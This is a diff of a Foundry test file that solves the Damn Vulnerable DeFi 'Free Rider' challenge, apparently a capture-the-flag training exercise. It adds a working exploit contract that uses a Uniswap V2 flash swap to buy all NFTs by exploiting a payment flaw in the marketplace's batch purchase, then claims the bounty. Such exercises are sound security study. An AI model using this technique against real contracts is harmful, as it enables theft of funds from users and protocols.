@@ -12,6 +12,9 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -64,7 +67,9 @@ contract FreeRiderChallenge is Test {
         );
 
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
-        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
+        uniswapV2Router.addLiquidityETH{
+            value: UNISWAP_INITIAL_WETH_RESERVE
+        }(
             address(token), // token to be traded against WETH
             UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
             0, // amountTokenMin
@@ -123,7 +128,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        // console.log(marketplace.offers(0) / 1 ether);
+        // console.log(marketplace.offers(1) / 1 ether);
+        // console.log(marketplace.offers(2) / 1 ether);
+        // console.log(marketplace.offers(3) / 1 ether);
+        // console.log(marketplace.offers(4) / 1 ether);
+        // console.log(marketplace.offers(5) / 1 ether);
+        // console.log(nft.owner());
+        // uint256[] calldata tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        Hack attack = new Hack{value: 0.09 ether}(uniswapPair, marketplace, weth, nft, recoveryManager);
+        attack.pwn();
+        attack.receiveBounty();
     }
 
     /**
@@ -145,4 +160,75 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract Hack {
+    WETH weth;
+    DamnValuableNFT nft;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableToken token;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderRecoveryManager recoveryManager;
+
+    address me;
+
+    // The NFT marketplace has 6 tokens, at 15 ETH each
+    uint256 constant NFT_PRICE = 15 ether;
+    uint256 constant AMOUNT_OF_NFTS = 6;
+    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;
+
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
+    uint256 constant BOUNTY = 45 ether;
+
+    // Initial reserves for the Uniswap V2 pool
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
+    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;
+
+    uint256[] nftTokens = [0, 1, 2, 3, 4, 5];
+
+    error Hack__NotAuthorized();
+
+    constructor(
+        IUniswapV2Pair _pair,
+        FreeRiderNFTMarketplace _marketplace,
+        WETH _weth,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager
+    ) payable {
+        uniswapPair = _pair;
+        marketplace = _marketplace;
+        weth = _weth;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        me = msg.sender;
+    }
+
+    function pwn() external {
+        uniswapPair.swap(15 ether, 0, address(this), "flashloan");
+    }
+
+    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
+        if (msg.sender != address(uniswapPair) && tx.origin != me) {
+            revert Hack__NotAuthorized();
+        }
+
+        weth.withdraw(NFT_PRICE);
+
+        marketplace.buyMany{value: NFT_PRICE}(nftTokens);
+
+        weth.deposit{value: NFT_PRICE + 0.05 ether}();
+        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
+    }
+
+    function receiveBounty() external {
+        for (uint256 i; i < nftTokens.length; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(me));
+        }
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
